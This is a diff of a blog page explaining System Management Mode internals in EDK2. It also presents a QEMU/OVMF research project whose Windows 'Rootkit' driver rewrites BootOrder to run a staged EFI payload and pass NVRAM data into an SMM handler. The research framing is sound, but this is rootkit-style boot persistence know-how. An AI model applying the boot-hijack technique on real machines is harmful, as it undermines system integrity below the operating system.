-</span></span></code></pre></div><p>This is the bridge between <strong>UefiCpuPkg</strong> and <strong>PiSmmCore</strong>. After this handoff, <strong>PiSmmCore</strong>&rsquo;s <strong>SmmEntryPoint</strong> updates the SMM core context:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-c data-lang=c><span style=display:flex><span>  <span style=color:#75715e>//
-</span></span></span><span style=display:flex><span>  <span style=color:#75715e>// Update SMST with contents of the SmmEntryContext structure
-</span></span></span><span style=display:flex><span>  <span style=color:#75715e>//
-</span></span></span><span style=display:flex><span>  gSmmCoreSmst.SmmStartupThisAp      <span style=color:#f92672>=</span> SmmEntryContext<span style=color:#f92672>-&gt;</span>SmmStartupThisAp;
-</span></span><span style=display:flex><span>  gSmmCoreSmst.CurrentlyExecutingCpu <span style=color:#f92672>=</span> SmmEntryContext<span style=color:#f92672>-&gt;</span>CurrentlyExecutingCpu;
-</span></span><span style=display:flex><span>  gSmmCoreSmst.NumberOfCpus          <span style=color:#f92672>=</span> SmmEntryContext<span style=color:#f92672>-&gt;</span>NumberOfCpus;
-</span></span><span style=display:flex><span>  gSmmCoreSmst.CpuSaveStateSize      <span style=color:#f92672>=</span> SmmEntryContext<span style=color:#f92672>-&gt;</span>CpuSaveStateSize;
-</span></span><span style=display:flex><span>  gSmmCoreSmst.CpuSaveState          <span style=color:#f92672>=</span> SmmEntryContext<span style=color:#f92672>-&gt;</span>CpuSaveState;
-</span></span></code></pre></div><p>After that, it eventually reaches <strong>SmiManage()</strong>, which iterates over the registered SMI handlers and calls them:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-c data-lang=c><span style=display:flex><span>  Head <span style=color:#f92672>=</span> <span style=color:#f92672>&amp;</span>SmiEntry<span style=color:#f92672>-&gt;</span>SmiHandlers;
-</span></span><span style=display:flex><span>  mSmiManageCallingDepth<span style=color:#f92672>++</span>;
-</span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span>  <span style=color:#66d9ef>for</span> (Link <span style=color:#f92672>=</span> Head<span style=color:#f92672>-&gt;</span>ForwardLink; Link <span style=color:#f92672>!=</span> Head; Link <span style=color:#f92672>=</span> Link<span style=color:#f92672>-&gt;</span>ForwardLink) {
-</span></span><span style=display:flex><span>    SmiHandler <span style=color:#f92672>=</span> <span style=color:#a6e22e>CR</span> (Link, SMI_HANDLER, Link, SMI_HANDLER_SIGNATURE);
-</span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span>    <span style=color:#75715e>/* Call the SMI Handler */</span>
-</span></span><span style=display:flex><span>    Status <span style=color:#f92672>=</span> SmiHandler<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>Handler</span> (
-</span></span><span style=display:flex><span>                         (EFI_HANDLE)SmiHandler,
-</span></span><span style=display:flex><span>                         Context,
-</span></span><span style=display:flex><span>                         CommBuffer,
-</span></span><span style=display:flex><span>                         CommBufferSize
-</span></span><span style=display:flex><span>                         );
-</span></span><span style=display:flex><span>  }
-</span></span></code></pre></div><p>So the flow is actually: <strong>InstallSmiHandler()</strong> prepares the per-CPU bootstrap code, <strong>gcSmiHandlerTemplate</strong> runs at <strong>SMBASE + 0x8000</strong>, <strong>SmiRendezvous()</strong> handles SMI entry inside <strong>UefiCpuPkg</strong>, the BSP path invokes <strong>PiSmmCore</strong> through the registered <strong>SmmEntryPoint</strong>, and finally <strong>SmiManage()</strong> dispatches the individual SMI handlers. In EDK2, the communication with an SMI handler is performed through <strong>EFI_SMM_COMMUNICATE_HEADER</strong>. I will touch that protocol later.</p><h3 id=abyss-of-nun-project><strong>Abyss of Nun Project</strong></h3><p>After digging into the internals of EDK2, I wanted a smaller project where the path from Windows to DXE and then into SMM could be observed directly. That is what <a href=https://github.com/0xbekoo/Abyss-of-Nun>Abyss of Nun</a> became: a QEMU + OVMF research project that stages a value in Windows, retrieves it again in pre-OS firmware, and finally forwards it into an SMM handler. The important point is that the project does <strong>not</strong> try to access SMRAM directly from Ring 0. Instead, it follows the interfaces that firmware actually exposes. Here&rsquo;s a diagram for the project:</p><div style=text-align:center><img src=/images/posts/smm-blog/project-diagram.png></div><br><br><p>At a high level, the chain looks like this:</p><ol><li>A Windows driver writes a <code>StolenData</code> UEFI variable.</li><li>The same driver modifies the boot flow so <code>TriggerSMI.efi</code> is executed on the next boot.</li><li><code>TriggerSMI.efi</code> reads that variable and sends it to SMM through <code>EFI_SMM_COMMUNICATION_PROTOCOL</code>.</li><li>The SMM driver receives the buffer through a registered MMI handler.</li></ol><h4 id=stage-1-windows-prepares-the-hand-off><strong>Stage 1: Windows Prepares the Hand-off</strong></h4><p>The Windows side lives under <code>Rootkit/Rootkit/main.c</code>. First, the driver defines the EFI payload path and the vendor GUID that will be used for the shared NVRAM variable:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-c data-lang=c><span style=display:flex><span>WCHAR EfiPath[] <span style=color:#f92672>=</span> <span style=color:#e6db74>L</span><span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\\</span><span style=color:#e6db74>EFI</span><span style=color:#ae81ff>\\</span><span style=color:#e6db74>BOOT</span><span style=color:#ae81ff>\\</span><span style=color:#e6db74>TriggerSMI.efi&#34;</span>;
-</span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span>GUID VendorGuid <span style=color:#f92672>=</span> {
-</span></span><span style=display:flex><span>  <span style=color:#ae81ff>0xa1b2c3d4</span>, <span style=color:#ae81ff>0x1234</span>, <span style=color:#ae81ff>0x5678</span>, {<span style=color:#ae81ff>0x9a</span>,<span style=color:#ae81ff>0xbc</span>,<span style=color:#ae81ff>0xde</span>,<span style=color:#ae81ff>0xf1</span>,<span style=color:#ae81ff>0x23</span>,<span style=color:#ae81ff>0x45</span>,<span style=color:#ae81ff>0x67</span>,<span style=color:#ae81ff>0x57</span>}
-</span></span><span style=display:flex><span>};
-</span></span></code></pre></div><p>These two values already show the intent of the driver. One value points to the firmware-stage payload, and the other defines the namespace for the data that the firmware side will later read.</p><p>The next step is the more interesting one: the driver rewrites the boot path by creating <code>Boot0009</code> and prepending it to <code>BootOrder</code>:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#a6e22e>RtlInitUnicodeString</span>(<span style=color:#f92672>&amp;</span>BootOrderName, <span style=color:#e6db74>L</span><span style=color:#e6db74>&#34;BootOrder&#34;</span>);
-</span></span><span style=display:flex><span><span style=color:#a6e22e>RtlInitUnicodeString</span>(<span style=color:#f92672>&amp;</span>PayloadVarName, <span style=color:#e6db74>L</span><span style=color:#e6db74>&#34;Boot0009&#34;</span>);
-</span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span>NewOrderArray[<span style=color:#ae81ff>0</span>] <span style=color:#f92672>=</span> TargetBootIndex;
-</span></span><span style=display:flex><span><span style=color:#a6e22e>RtlCopyMemory</span>(<span style=color:#f92672>&amp;</span>NewOrderArray[<span style=color:#ae81ff>1</span>], OrderArray, BootOrderSize);
-</span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span>Status <span style=color:#f92672>=</span> <span style=color:#a6e22e>ExSetFirmwareEnvironmentVariable</span>(
-</span></span><span style=display:flex><span>  <span style=color:#f92672>&amp;</span>BootOrderName,
-</span></span><span style=display:flex><span>  (LPGUID)<span style=color:#f92672>&amp;</span>EfiGlobalVariableGuid,
-</span></span><span style=display:flex><span>  NewOrderArray,
-</span></span><span style=display:flex><span>  NewOrderSize,
-</span></span><span style=display:flex><span>  TARGET_ATTRIBUTES
-</span></span><span style=display:flex><span>);
-</span></span></code></pre></div><p>This part matters because the driver is not invoking SMM by itself. It is preparing the next boot so that firmware executes <code>TriggerSMI.efi</code> before the normal Windows boot path resumes. In other words, Windows becomes the staging layer, not the direct SMM caller.</p><p>Finally, <code>DriverEntry()</code> writes the payload into NVRAM as <code>StolenData</code>:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-c data-lang=c><span style=display:flex><span>UNICODE_STRING VariableName <span style=color:#f92672>=</span> <span style=color:#a6e22e>RTL_CONSTANT_STRING</span>(<span style=color:#e6db74>L</span><span style=color:#e6db74>&#34;StolenData&#34;</span>);
-</span></span><span style=display:flex><span>WCHAR Buffer[] <span style=color:#f92672>=</span> <span style=color:#e6db74>L</span><span style=color:#e6db74>&#34;im cooked!&#34;</span>;
-</span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span>Status <span style=color:#f92672>=</span> <span style=color:#a6e22e>ExSetFirmwareEnvironmentVariable</span>(
-</span></span><span style=display:flex><span>  <span style=color:#f92672>&amp;</span>VariableName,
-</span></span><span style=display:flex><span>  <span style=color:#f92672>&amp;</span>VendorGuid,
-</span></span><span style=display:flex><span>  <span style=color:#f92672>&amp;</span>Buffer,
-</span></span><span style=display:flex><span>  BufferSize,
-</span></span><span style=display:flex><span>  Attributes
-</span></span><span style=display:flex><span>);
-</span></span></code></pre></div><p>So the Windows half of the repository does two jobs: it stores the value in a firmware-visible variable, and it ensures that the DXE-stage bridge will run on the next boot.</p><h4 id=stage-2-dxe-bridges-the-data-into-smm><strong>Stage 2: DXE Bridges the Data into SMM</strong></h4><p>The firmware bridge is <code>AbyssOfNunSMM/TriggerSMI.c</code>. This is a <code>UEFI_APPLICATION</code>, not the final SMM driver. Its first job is to read the exact variable that the Windows driver created:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-c data-lang=c><span style=display:flex><span>CHAR16 <span style=color:#f92672>*</span>VariableName <span style=color:#f92672>=</span> <span style=color:#e6db74>L</span><span style=color:#e6db74>&#34;StolenData&#34;</span>;
-</span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span>Status <span style=color:#f92672>=</span> <span style=color:#a6e22e>GetVariable2</span>(VariableName, <span style=color:#f92672>&amp;</span>VendorGuid, <span style=color:#f92672>&amp;</span>Memory, <span style=color:#f92672>&amp;</span>StringSize);
-</span></span><span style=display:flex><span><span style=color:#66d9ef>if</span> (<span style=color:#a6e22e>EFI_ERROR</span>(Status)) {
-</span></span><span style=display:flex><span>  <span style=color:#a6e22e>DEBUG</span>((DEBUG_ERROR, <span style=color:#e6db74>&#34;[TriggerSMI] Failed to get the variable: %r</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>, Status));
-</span></span><span style=display:flex><span>  <span style=color:#66d9ef>return</span> Status;
-</span></span><span style=display:flex><span>}
-</span></span></code></pre></div><p>After retrieving the variable, the application locates <code>EFI_SMM_COMMUNICATION_PROTOCOL</code>, prepares an <code>EFI_SMM_COMMUNICATE_HEADER</code>, and forwards the buffer into SMM:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-c data-lang=c><span style=display:flex><span>Status <span style=color:#f92672>=</span> gBS<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>LocateProtocol</span>(
-</span></span><span style=display:flex><span>  <span style=color:#f92672>&amp;</span>gEfiSmmCommunicationProtocolGuid,
-</span></span><span style=display:flex><span>  NULL,
-</span></span><span style=display:flex><span>  (VOID <span style=color:#f92672>**</span>)<span style=color:#f92672>&amp;</span>SmmCommunication
-</span></span><span style=display:flex><span>);
-</span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span>CommSize <span style=color:#f92672>=</span> <span style=color:#a6e22e>OFFSET_OF</span>(EFI_SMM_COMMUNICATE_HEADER, Data) <span style=color:#f92672>+</span> StringSize;
-</span></span><span style=display:flex><span><span style=color:#a6e22e>CopyMem</span>(CommHeader<span style=color:#f92672>-&gt;</span>Data, Buffer, StringSize);
-</span></span><span style=display:flex><span>CommHeader<span style=color:#f92672>-&gt;</span>MessageLength <span style=color:#f92672>=</span> StringSize;
-</span></span><span style=display:flex><span><span style=color:#a6e22e>CopyGuid</span>(<span style=color:#f92672>&amp;</span>CommHeader<span style=color:#f92672>-&gt;</span>HeaderGuid, <span style=color:#f92672>&amp;</span>gAbyssOfNunSmiGuid);
-</span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span>Status <span style=color:#f92672>=</span> SmmCommunication<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>Communicate</span>(
-</span></span><span style=display:flex><span>  SmmCommunication,
-</span></span><span style=display:flex><span>  CommHeader,
-</span></span><span style=display:flex><span>  <span style=color:#f92672>&amp;</span>CommSize
-</span></span><span style=display:flex><span>);
-</span></span></code></pre></div><p>This is the most important bridge in the whole project. The repo does not model a fantasy &ldquo;Windows talks to SMRAM directly&rdquo; workflow. It models a far more realistic chain where a DXE-stage component uses the standard SMM communication mechanism to pass a buffer into an SMM handler.</p><p>After the communication finishes, <code>TriggerSMI.efi</code> restores the normal boot path by loading <code>bootx64.efi</code>:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-c data-lang=c><span style=display:flex><span>DevicePath <span style=color:#f92672>=</span> <span style=color:#a6e22e>FileDevicePath</span>(LoadedImage<span style=color:#f92672>-&gt;</span>DeviceHandle, <span style=color:#e6db74>L</span><span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\\</span><span style=color:#e6db74>EFI</span><span style=color:#ae81ff>\\</span><span style=color:#e6db74>BOOT</span><span style=color:#ae81ff>\\</span><span style=color:#e6db74>bootx64.efi&#34;</span>);
-</span></span><span style=display:flex><span>Status <span style=color:#f92672>=</span> gBS<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>LoadImage</span>(FALSE, ImageHandle, DevicePath, NULL, <span style=color:#ae81ff>0</span>, <span style=color:#f92672>&amp;</span>NewImageHandle);
-</span></span><span style=display:flex><span>Status <span style=color:#f92672>=</span> gBS<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>StartImage</span>(NewImageHandle, NULL, NULL);
-</span></span></code></pre></div><p>So the DXE application is not just a messenger. It is also the component that keeps the boot chain coherent after the hand-off into SMM.</p><h4 id=stage-3-the-smm-driver-receives-the-buffer><strong>Stage 3: The SMM Driver Receives the Buffer</strong></h4><p>The SMM side lives in <code>AbyssOfNunSMM/AbyssOfNun.c</code>. During entry, the driver registers its handler with <code>gMmst->MmiHandlerRegister()</code> using the same GUID that <code>TriggerSMI.c</code> places into the communication header:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-c data-lang=c><span style=display:flex><span>Status <span style=color:#f92672>=</span> gMmst<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>MmiHandlerRegister</span>(
-</span></span><span style=display:flex><span>  AbyssOfNunHandler,
-</span></span><span style=display:flex><span>  <span style=color:#f92672>&amp;</span>gAbyssOfNunSmiGuid,
-</span></span><span style=display:flex><span>  <span style=color:#f92672>&amp;</span>DispatchHandle
-</span></span><span style=display:flex><span>);
-</span></span></code></pre></div><p>That handler then treats the communication buffer as a <code>CHAR16</code> string, allocates memory from SMM pool, and copies the incoming data:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-c data-lang=c><span style=display:flex><span>ReceivedString <span style=color:#f92672>=</span> (CHAR16 <span style=color:#f92672>*</span>)CommBuffer;
-</span></span><span style=display:flex><span>StringSize <span style=color:#f92672>=</span> <span style=color:#a6e22e>StrSize</span>(ReceivedString);
-</span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span>Status <span style=color:#f92672>=</span> gSmst<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>SmmAllocatePool</span>(EfiRuntimeServicesData, StringSize, <span style=color:#f92672>&amp;</span>Memory);
-</span></span><span style=display:flex><span>CHAR16 <span style=color:#f92672>*</span>CharVault <span style=color:#f92672>=</span> (CHAR16 <span style=color:#f92672>*</span>)Memory;
-</span></span><span style=display:flex><span><span style=color:#a6e22e>CopyMem</span>(CharVault, ReceivedString, StringSize);
-</span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span>gSmst<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>SmmFreePool</span>(Memory);
-</span></span></code></pre></div><p>This code is exactly why I find the project useful in the context of SMM research. It proves that the buffer prepared in Windows can travel through NVRAM, through a DXE bridge, and into an SMM handler. At the same time, it also exposes an important limitation very clearly: the pool is freed before the handler returns, so the current implementation demonstrates <strong>delivery into SMM</strong>, not durable long-term persistence inside SMRAM.</p><p>After these, the project will look like thiS in the beginning:</p><div style=text-align:center><img src=/images/posts/smm-blog/project-result.png></div><br><br><p>And the debug.log:</p><pre tabindex=0><code>
+<!DOCTYPE html>
+<html lang="en"><head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+    <title>0xbekoo</title>
+    <meta content="text/html;charset=utf-8" http-equiv="Content-Type">
+    <meta content="utf-8" http-equiv="encoding">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="format-detection" content="telephone=no" />
+    <meta name="theme-color" content="#000084" />
+    <link rel="icon" href="/favicon.ico">
+    <link rel="canonical" href="/blogs/diving-deep-into-smm/">
+    <noscript><style>body { visibility: visible !important; }</style></noscript>
+</head>
+<body>
+<nav class="navbar navbar-inverse navbar-fixed-top">
+    <div class="navbar-inner">
+        <div class="container">
+            <button type="button" class="btn btn-navbar" data-toggle="collapse" data-target=".nav-collapse"></button>
+            <a class="brand" href="/">0xbekoo</a>
+            <div class="nav-collapse collapse">
+                <ul class="nav">
+                    
+                    
+                        
+                            <li>
+                                <a href="/docs/">
+                                    
+                                    <span>Documentation</span>
+                                </a>
+                            </li>
+                        
+                    
+                        
+                            <li>
+                                <a href="/blogs/">
+                                    
+                                    <span>Blogs</span>
+                                </a>
+                            </li>
+                        
+                    
+                        
+                            <li>
+                                <a href="/projects/">
+                                    
+                                    <span>Projects</span>
+                                </a>
+                            </li>
+                        
+                    
+                </ul>
+            </div>
+        </div>
+    </div>
+</nav>
+<div id="content" class="container">
+
+
+
+
+
+
+
+
+
+
+    
+    
+    
+    
+    
+
+
+
+
+<article class="single-shell single-shell--blogs">
+    <div class="row-fluid navmargin">
+        <div class="page-header single-shell__header">
+            <h1 class="single-shell__title">An In-Depth Look at the System Management Mode of Processors</h1>
+            <p class="single-shell__meta">Thu, Mar 26, 2026</p>
+        </div>
+        <div class="single-shell__body single-shell__body--with-toc">
+            <div class="single-shell__main">
+                
+                
+                <section class="single-shell__author single-shell__author--mobile">
+                    <div class="single-shell__author-static" aria-hidden="true"></div>
+                    <div class="single-shell__author-heading">About Author</div>
+                    <div class="single-shell__author-card">
+                        <a class="single-shell__author-photo-link" href="https://github.com/0xbekoo">
+                        <div class="single-shell__author-photo-shell">
+                            <img class="single-shell__author-photo" src="https://github.com/0xbekoo.png" alt="0xbekoo">
+                        </div>
+                        </a>
+                        <div class="single-shell__author-body">
+                            <a class="single-shell__author-name-link" href="https://github.com/0xbekoo">
+                            <span class="single-shell__author-name" data-text="0xbekoo">0xbekoo</span>
+                            </a>
+                            <p class="single-shell__author-title">Low-Level Security Researcher</p>
+                        </div>
+                    </div>
+                </section>
+                
+                
+                <section class="single-shell__toc single-shell__toc--mobile is-open" data-ui="toc">
+                    <button class="single-shell__toc-toggle" type="button" aria-expanded="true" aria-controls="single-toc-mobile-blogs-diving-deep-into-smm-">
+                        <span class="single-shell__toc-label">Contents</span>
+                        <span class="single-shell__toc-status" aria-hidden="true">[-]</span>
+                    </button>
+                    <div id="single-toc-mobile-blogs-diving-deep-into-smm-" class="single-shell__toc-panel">
+                        <div class="single-shell__toc-panel-inner">
+                            <div class="single-shell__toc-body">
+                                <nav id="TableOfContents-mobile">
+  <ul>
+    <li>
+      <ul>
+        <li><a href="#introduction"><strong>Introduction</strong></a></li>
+        <li><a href="#system-management-mode-smm"><strong>System Management Mode (SMM)</strong></a>
+          <ul>
+            <li><a href="#entering-smm-with-system-management-interrupt-smi"><strong>Entering SMM with System Management Interrupt (SMI)</strong></a></li>
+            <li><a href="#system-management-ram-smram"><strong>System Management RAM (SMRAM)</strong></a></li>
+          </ul>
+        </li>
+        <li><a href="#introduction-to-smm-in-edk2"><strong>Introduction to SMM in EDK2</strong></a>
+          <ul>
+            <li><a href="#initializing-of-smbase-and-the-save-state-map"><strong>Initializing of SMBASE and The Save State Map</strong></a></li>
+            <li><a href="#preparing-smi-handler-area"><strong>Preparing SMI Handler Area</strong></a></li>
+            <li><a href="#handling-a-smi"><strong>Handling a SMI</strong></a></li>
+          </ul>
+        </li>
+        <li><a href="#abyss-of-nun-project"><strong>Abyss of Nun Project</strong></a>
+          <ul>
+            <li><a href="#stage-1-windows-prepares-the-hand-off"><strong>Stage 1: Windows Prepares the Hand-off</strong></a></li>
+            <li><a href="#stage-2-dxe-bridges-the-data-into-smm"><strong>Stage 2: DXE Bridges the Data into SMM</strong></a></li>
+            <li><a href="#stage-3-the-smm-driver-receives-the-buffer"><strong>Stage 3: The SMM Driver Receives the Buffer</strong></a></li>
+          </ul>
+        </li>
+        <li><a href="#conclusion"><strong>Conclusion</strong></a></li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+                            </div>
+                        </div>
+                    </div>
+                </section>
+                
+                <div class="single-shell__content">
+                    <p>It&rsquo;s gonna be hard, I guess.</p>
+<h3 id="introduction"><strong>Introduction</strong></h3>
+<p>Welcome to my journey into the underworld. In this blog, we’ll take an in-depth look at the “god mode” of processors. Grab your gas mask and follow me.</p>
+<p>Recently I was really wondering what this SMM actually is, and I found myself diving into these primordial waters. What makes SMM particularly fascinating—and dangerous—is its absolute control over the system. Code running in SMM can access all memory, modify any data structure, and remain completely invisible to security software.</p>
+<p>System Management Mode (SMM) is one of the most privileged execution modes in x86 architecture, operating at a level even higher than the operating system kernel or hypervisor. It&rsquo;s a special-purpose operating mode that provides an isolated execution environment for handling system-wide functions such as power management, hardware control, and proprietary OEM code.</p>
+<p>The main reference for this blog comes from <strong>Intel X64 and IA-32 Architectures Software Developer’s Manual Volume 3C: System Programming Guide Part 3</strong> (Page 207).</p>
+<h3 id="system-management-mode-smm"><strong>System Management Mode (SMM)</strong></h3>
+<p>As you can see from the introduction, this god-mode was designed to manage the entire system transparently. Unlike other rings we know, such as Ring 0 (Kernel Mode) from OS or Hypervisor, the System Management mode is the deepest ring on the processor:</p>
+<div style="text-align: center;">
+  <img src="/images/posts/smm-blog/rings.jpg"/>
+</div> <br> <br>
+<p>Also you can see that there&rsquo;s &lsquo;ME&rsquo; ring, however this is another topic and this ring isn&rsquo;t on the processor. In fact, the most powerful one is ME because it is an autonomous subsystem that has been incorporated in virtually all of Intel&rsquo;s processor chipsets. So if we can talk about the processor, the SMM is the deepest level on the processor. I will write a blog for this ME ring.</p>
+<p>The SMM has special purposes to manage hardware, such as power-management, system hardware control etc, and this ring is isolated from other rings and intended for use only by system firmware. So with this isolation, it manages the entire system with full access. We cannot communicate with it from Ring 3 or even Ring 0! With this in mind, <strong>we can think of the main idea of SMM as an isolated processor environment from the OS that operates the system transparently.</strong></p>
+<p>For the processor to enter SMM, a <strong>System Management Interrupt</strong> (SMI) request needs to be invoked. With the SMI request, the processor will stop the whole process and enter SMM immediately. I know this may look strange that the processor will stop the whole process and this means that when an SMI request is received, the OS will freeze.</p>
+<p>Because the processor saves its current state when it enters SMM, then it jumps to a new space, aka SMRAM fields (We will see this in detail). In the SMM there are SMI handlers, which singular name is <strong>The system management software executive</strong> and the processor starts execution of the instructions from the SMI Handler. Each SMI Request corresponds to its SMI Handler. To better understand: here&rsquo;s an example:</p>
+<div style="text-align: center;">
+  <img src="/images/posts/smm-blog/diagram.png"/>
+</div> <br> <br>
+<p><strong>Physical Memory Region</strong> (SMRAM) holds the critical code and data of the SMI Handler. The processor jumps into the SMRAM space and executes the SMI request in the SMRAM. When an SMI Handler has completed its operations, the processor will execute an RSM (Resume) instruction to exit. This instruction can only be executed from SMM.</p>
+<h4 id="entering-smm-with-system-management-interrupt-smi"><strong>Entering SMM with System Management Interrupt (SMI)</strong></h4>
+<p>The only way to enter SMM is by signaling an SMI through the SMI# pin on the processor or through an SMI message received through the APIC bus. When the processor enters SMM, the processor switches to a new address space and <strong>paging is disabled</strong>! Here we need to understand what this actually is.</p>
+<h4 id="system-management-ram-smram"><strong>System Management RAM (SMRAM)</strong></h4>
+<p>System Management RAM provides SMM address space for SMI Handler&rsquo;s code and data. The default SMRAM size is 64 KBytes beginning at a base physical address in physical memory called the SMBASE. In Intel documentations, The SMBASE default value is <strong>0x30000</strong> and the processor looks for the first instruction of the SMI Handler at <strong>[SMIBASE + 0x8000]</strong>, while it stores its context in <strong>[SMBASE + 0xFE00]</strong>. Here&rsquo;s a table from Intel:</p>
+<div style="text-align: center;">
+  <img src="/images/posts/smm-blog/photo1.png"/>
+</div> <br> <br>
+<div style="text-align: center;">
+  <img src="/images/posts/smm-blog/photo2.png" />
+</div> <br> <br>
+<p>We can see the state save map. Control Register CR4 is completely cleared to all 0s when entering SMM, while the hidden segment descriptor information stored in segment registers. Especially Debug Registers (DR0 - DR3), the X87 FPU Registers or Control Register CR2 are not saved and restored when entering and exiting SMM.</p>
+<h3 id="introduction-to-smm-in-edk2"><strong>Introduction to SMM in EDK2</strong></h3>
+<p>Since I don&rsquo;t have real silicon, I continued my research with EDK2 (for OvmfPkg). In this section we will take a closer look at SMM.</p>
+<h4 id="initializing-of-smbase-and-the-save-state-map"><strong>Initializing of SMBASE and The Save State Map</strong></h4>
+<p>The SMBASE location is prepared by <strong>SmmCpuFeaturesInitializeProcessor()</strong> function in <strong>SmmCpuFeaturesLib.h</strong>. This function prepares the save state map and SMBASE locations:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>BOOLEAN mSmmCpuFeaturesSmmRelocated;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>VOID
+</span></span><span style="display:flex;"><span>EFIAPI
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">SmmCpuFeaturesInitializeProcessor</span> (
+</span></span><span style="display:flex;"><span>  IN UINTN                      CpuIndex,
+</span></span><span style="display:flex;"><span>  IN BOOLEAN                    IsMonarch,
+</span></span><span style="display:flex;"><span>  IN EFI_PROCESSOR_INFORMATION  <span style="color:#f92672">*</span>ProcessorInfo,
+</span></span><span style="display:flex;"><span>  IN CPU_HOT_PLUG_DATA          <span style="color:#f92672">*</span>CpuHotPlugData
+</span></span><span style="display:flex;"><span>  )
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>  AMD_SMRAM_SAVE_STATE_MAP  <span style="color:#f92672">*</span>CpuState;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#75715e">//
+</span></span></span><span style="display:flex;"><span>  <span style="color:#75715e">// No need to configure SMBASE if SmBase relocation has been done.
+</span></span></span><span style="display:flex;"><span>  <span style="color:#75715e">//
+</span></span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>mSmmCpuFeaturesSmmRelocated) {
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">//
+</span></span></span><span style="display:flex;"><span>    <span style="color:#75715e">// Configure SMBASE.
+</span></span></span><span style="display:flex;"><span>    <span style="color:#75715e">//
+</span></span></span><span style="display:flex;"><span>    CpuState <span style="color:#f92672">=</span> (AMD_SMRAM_SAVE_STATE_MAP <span style="color:#f92672">*</span>)(UINTN)(
+</span></span><span style="display:flex;"><span>                 SMM_DEFAULT_SMBASE <span style="color:#f92672">+</span> SMRAM_SAVE_STATE_MAP_OFFSET
+</span></span><span style="display:flex;"><span>                 );
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> ((CpuState<span style="color:#f92672">-&gt;</span>x86.SMMRevId <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xFFFF</span>) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>) {
+</span></span><span style="display:flex;"><span>      CpuState<span style="color:#f92672">-&gt;</span>x86.SMBASE <span style="color:#f92672">=</span> (UINT32)CpuHotPlugData<span style="color:#f92672">-&gt;</span>SmBase[CpuIndex];
+</span></span><span style="display:flex;"><span>    } <span style="color:#66d9ef">else</span> {
+</span></span><span style="display:flex;"><span>      CpuState<span style="color:#f92672">-&gt;</span>x64.SMBASE <span style="color:#f92672">=</span> (UINT32)CpuHotPlugData<span style="color:#f92672">-&gt;</span>SmBase[CpuIndex];
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>  <span style="color:#75715e">//
+</span></span></span><span style="display:flex;"><span>  <span style="color:#75715e">// No need to program SMRRs on our virtual platform.
+</span></span></span><span style="display:flex;"><span>  <span style="color:#75715e">//
+</span></span></span><span style="display:flex;"><span>}
